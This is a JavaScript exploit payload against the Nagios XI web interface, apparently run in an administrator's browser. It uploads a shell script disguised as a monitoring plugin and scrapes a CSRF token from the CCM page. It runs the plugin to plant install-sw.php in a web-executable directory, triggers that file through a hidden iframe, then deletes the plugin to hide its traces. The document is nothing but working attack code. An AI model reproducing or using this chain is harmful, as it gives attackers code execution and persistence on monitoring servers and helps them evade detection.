var plugin_name = 'check_sw.sh';
var nsp = window.nsp_str || window.top.nsp_str; // we might be inside the iframe
// base64 value is the encoded contents of install-sw.php
var plugin_payload = `
#!/bin/sh

%%SW_PLUGIN_PAYLOAD%%

`;

// Upload plugin with the above payload
var fd = new FormData();
fd.append('upload', 1);
fd.append('nsp', nsp); 
fd.append('uploadedfile', new Blob([plugin_payload]), plugin_name);
fetch('/nagiosxi/admin/monitoringplugins.php', { method: 'POST', body: fd })
  .then(function() {
    // Now we need to grab the CSRF token
    return fetch('/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=command');
  })
  .then(function(res) {
    return res.text();
  })
  .then(function(page) {
    // Extract token
    var found = page.match(/token" type="hidden" value="(\w+)"/);
    // Run plugin code creating install-sw.php
    return fetch(`/nagiosxi/includes/components/ccm/command_test.php?cmd=help&mode=help&plugin=${plugin_name}&token=${found[1]}`);
  })
  .then(function() {
    // install sw in a hidden iframe now that we've added install-sw.php in a directory it will execute
    var fragment = document.createDocumentFragment();
    var iframe = document.createElement('iframe');
    iframe.setAttribute("src", "/nagiosxi/includes/components/highcharts/exporting-server/temp/install-sw.php");
    iframe.setAttribute("style", "display: none");
    fragment.appendChild(iframe);
    document.body.appendChild(fragment);
    // remove plugin
    return fetch(`/nagiosxi/admin/monitoringplugins.php?delete=${plugin_name}&nsp=${nsp}`);
  });